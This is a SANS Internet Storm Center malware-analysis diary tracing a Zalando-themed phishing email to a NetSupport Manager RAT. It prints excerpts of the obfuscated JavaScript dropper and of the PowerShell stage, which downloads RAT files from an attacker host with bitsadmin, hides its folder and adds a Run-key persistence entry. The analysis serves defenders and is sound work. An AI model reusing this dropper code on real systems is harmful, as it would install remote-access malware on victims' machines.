---
title: From a Zalando Phishing to a RAT - SANS Internet Storm Center
url: https://isc.sans.edu/diary/30136
published_date: 2025-10-28T06:44:39.475541
collected_date: 2025-10-28T06:44:39.475599
source: Isc
source_url: https://isc.sans.edu
author: SANS Internet Storm Center
description: Handler on Duty: [Jan Kopriva](https://isc.sans.edu/handler_list.html#jan-kopriva)
language: en
---

# From a Zalando Phishing to a RAT - SANS Internet Storm Center

*By SANS Internet Storm Center*

Handler on Duty: [Jan Kopriva](https://isc.sans.edu/handler_list.html#jan-kopriva)

Handler on Duty: [Jan Kopriva](https://isc.sans.edu/handler_list.html#jan-kopriva)

Threat Level: [green](https://isc.sans.edu/infocon.html)

- [previous](https://isc.sans.edu/diary/30130)
- [next](https://isc.sans.edu/diary/30138)

| | | |
| --- | --- | --- |
| [Reverse-Engineering Malware: Malware Analysis Tools and Techniques](https://www.sans.org/event/london-november-2025/course/reverse-engineering-malware-malware-analysis-tools-techniques) | London | Nov 3rd - Nov 8th 2025 |

# [From a Zalando Phishing to a RAT](https://isc.sans.edu/forums/diary/From+a+Zalando+Phishing+to+a+RAT/30136/)

**Published**: 2023-08-18. **Last Updated**: 2023-08-18 06:11:34 UTC
**by** [Xavier Mertens](https://isc.sans.edu/handler_list.html#xavier-mertens) (Version: 1)

[1 comment(s)](https://isc.sans.edu/diary/From+a+Zalando+Phishing+to+a+RAT/30136/#comments)

Phishing remains a lucrative threat. We get daily emails from well-known brands (like DHL, PayPal, Netflix, Microsoft, Dropbox, Apple, etc). Recently, I received a bunch of phishing emails targeting Zalando customers. Zalando is a German retailer of shoes, fashion across Europe. It was the first time that I saw them used in a phishing campaign.

The attached archive contains a single JavaScript file:

```
remnux@remnux:/MalwareZoo/20230816$ zipdump.py nine-life1107.zip
Index Filename Encrypted Timestamp
 1 nine-life1107.js 0 2023-08-15 12:23:08

As usual, with this language, the script is pretty well obfuscated. Here is an example of an implemented function:

```
(function (E, i) {
 var hw = {
 E: '0x264',
 i: 'XgQW',
 u: '0x246',
 z: 'OMHH',
 S: '0x211',
 L: '4[3N',
 T: '0x1ae',
 f: '@(sj',
 R: '0x230',
 Q: '8JTc',
 g: '0x1c0',
 n: '$GmP',
 d: 'CgxP',
 l: '0x1dc',
 W: 'Q9Z5',
 c: '0x1a9',
 x: '90vH'
 };
 var s = Y;
 var J = Y;
 var o = Y;
 var V = Y;
 var D = Y;
 var u = E();
 while (!![]) {
 try {
 var z = -parseInt(s(hw.E, hw.i)) / 0x1 + parseInt(J(hw.u, hw.z)) / 0x2 * (parseInt(J(hw.S, hw.L)) / 0x3) + -parseInt(o(hw.T, hw.f)) / 0x4 * (parseInt(s(hw.R, hw.Q)) / 0x5) + parseInt(V(hw.g, hw.n)) / 0x6 + -parseInt(V('0x22f', hw.d)) / 0x7 + parseInt(D(hw.l, hw.W)) / 0x8 + -parseInt(o(hw.c, hw.x)) / 0x9;
 if (z === i) {
 break;
 } else {
 u['push'](u['shift']());
 }
 } catch (S) {
 u['push'](u['shift']());
 }
 }
}(y, 0x75686));
```

Diving into the code to spot interesting strings or techniques is always interesting. The script contains some references to "WScript" to call the method "ShellExecute"… We are facing a script for Windows. The script is a dropper and will drop/execute a PowerShell script:

```
C:\Users\user01\AppData\Roaming\42c0tyi.ps1
```

The script is less heavily obfuscated and easy to understand. It uses bitsadmin.exe, the well-known LOLbin, to download many files from a website. Well, not always bitsadmin.exe. This tool can be called directly from Powershell. That's what the attacker is testing in this case: The script checks if BitsAdmin and ExpandArchive are available inside PowerShell and use them. Otherwise, it will launch the standalone executable and download files one by one:

```
$g3tSp4=Get-Command expand-archive -ErrorAction SilentlyContinue;
$PsaB17=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue;
if ($g3tSp4) {
 if ($PsaB17) {
 Start-BitsTransfer -Source $l1kps4 -Destination $p47Spa;
 }
 else {
 Invoke-Expression -Command $sPaad
 };
 expand-archive -path $p47Spa -destinationpath $SP4z3p;
 Remove-Item -path $p47Spa;
}
else {
 $f1lePsa=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', \
  'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL');
 $l1kps42='https://tukudewe.com/js/h3b2_jsg/';
 New-Item -Path $env:APPDATA -Name $sP4k3 -ItemType 'directory';
 if ($PsaB17) {
 $f1lePsa | ForEach-Object {
 $sp4suR=$l1kps42+$_;
 $spaD3s7=$SP4z3p+'\'+$_;
 Start-BitsTransfer -Source $sp4suR -Destination $spaD3s7;
 };
 }
 else {
 $f1lePsa | ForEach-Object {
 $sp4suR=$l1kps42+$_;
 $spaD3s7=$SP4z3p+'\'+$_;
 $sPaad2='bitsadmin.exe /transfer Spadow /download /priority normal '+$sp4suR+' '+$spaD3s7;
 Invoke-Expression -Command $sPaad2;
 };
 };
};

Another trick used in the script: Files are downloaded in the directory  C:\\Users\\REM\\AppData\\Roaming\\MsEdgeSandbox, and the directory attributes are modified to hide it:

```
$H1foSp4=Get-Item $SP4z3p -Force;
$H1foSp4.attributes='Hidden';
cd $SP4z3p;
```

Finally, persistence is implemented:

```
$p4t3hCl1=$SP4z3p+'\client32.exe';
New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name $sP4k3 -Value $p4t3hCl1 -PropertyType 'String';
```

The zip archive, the Javascript, and Powershell were unavailable on VT. What about the downloaded malware? Many files are downloaded on the victim's computer, but the first one to be executed is "client32.exe" (SHA256:89f0c8f170fe9ea28b1056517160e92e2d7d4e8aa81f4ed696932230413a6ce1) and has a low VT score: 5/71\[ [1](https://www.virustotal.com/gui/file/89f0c8f170fe9ea28b1056517160e92e2d7d4e8aa81f4ed696932230413a6ce1/detection)\]. This malware is a good old NetSupport Manager RAT\[ [2](https://www.netsupportmanager.com)\]! No need to perform deep reverse engineering. The RAT configuration is available in the file client32.ini. The C2 server is: jokosampbulid1\[.\]com:1412 (which is down when writing this diary).

The RAT files are downloaded from tukudewe\[.\]com.

\[1\] [https://www.virustotal.com/gui/file/89f0c8f170fe9ea28b1056517160e92e2d7d4e8aa81f4ed696932230413a6ce1/detection](https://www.virustotal.com/gui/file/89f0c8f170fe9ea28b1056517160e92e2d7d4e8aa81f4ed696932230413a6ce1/detection)
\[2\] [https://www.netsupportmanager.com](https://www.netsupportmanager.com)

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Malware](https://isc.sans.edu/tag.html?tag=Malware) [NetSupport](https://isc.sans.edu/tag.html?tag=NetSupport) [Phishing](https://isc.sans.edu/tag.html?tag=Phishing) [RAT](https://isc.sans.edu/tag.html?tag=RAT)

[1 comment(s)](https://isc.sans.edu/diary/From+a+Zalando+Phishing+to+a+RAT/30136/#comments)

| | | |
| --- | --- | --- |
| [Reverse-Engineering Malware: Malware Analysis Tools and Techniques](https://www.sans.org/event/london-november-2025/course/reverse-engineering-malware-malware-analysis-tools-techniques) | London | Nov 3rd - Nov 8th 2025 |

- [previous](https://isc.sans.edu/diary/30130)
- [next](https://isc.sans.edu/diary/30138)

Can we get details on how you deofuscated? I'm looking to get better at identifying obfuscated code and figuring out what is required to deofuscated. I often run into base64 to start but then get special characters and don't know how to proceed. If you could provide that information it would be extremely helpful to not only me but other's looking to dig deeper as well.

#### Aug 21st 20232 years ago

[Login here to join the discussion.](https://isc.sans.edu/login)

[Top of page](https://isc.sans.edu/isc.sans.edu)

[Diary Archives](https://isc.sans.edu/diaryarchive.html)

- [Homepage](https://isc.sans.edu/index.html)
- [Diaries](https://isc.sans.edu/diaryarchive.html)
- [Podcasts](https://isc.sans.edu/podcast.html)
- [Jobs](https://isc.sans.edu/jobs)
- [Data](https://isc.sans.edu/data)
 - [TCP/UDP Port Activity](https://isc.sans.edu/data/port.html)
 - [Port Trends](https://isc.sans.edu/data/trends.html)
 - [SSH/Telnet Scanning Activity](https://isc.sans.edu/data/ssh.html)
 - [Weblogs](https://isc.sans.edu/weblogs)
 - [Domains](https://isc.sans.edu/data/domains.html)
 - [Threat Feeds Activity](https://isc.sans.edu/data/threatfeed.html)
 - [Threat Feeds Map](https://isc.sans.edu/data/threatmap.html)
 - [Useful InfoSec Links](https://isc.sans.edu/data/links.html)
 - [Presentations & Papers](https://isc.sans.edu/data/presentation.html)
 - [Research Papers](https://isc.sans.edu/data/researchpapers.html)
 - [API](https://isc.sans.edu/api)
- [Tools](https://isc.sans.edu/tools/)
 - [DShield Sensor](https://isc.sans.edu/howto.html)
 - [DNS Looking Glass](https://isc.sans.edu/tools/dnslookup)
 - [Honeypot (RPi/AWS)](https://isc.sans.edu/tools/honeypot)
 - [InfoSec Glossary](https://isc.sans.edu/tools/glossary)
- [Contact Us](https://isc.sans.edu/contact.html)
 - [Contact Us](https://isc.sans.edu/contact.html)
 - [About Us](https://isc.sans.edu/about.html)
 - [Handlers](https://isc.sans.edu/handler_list.html)
- [About Us](https://isc.sans.edu/about.html)

[Slack Channel](https://isc.sans.edu/slack/index.html)

[Mastodon](https://infosec.exchange/@sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)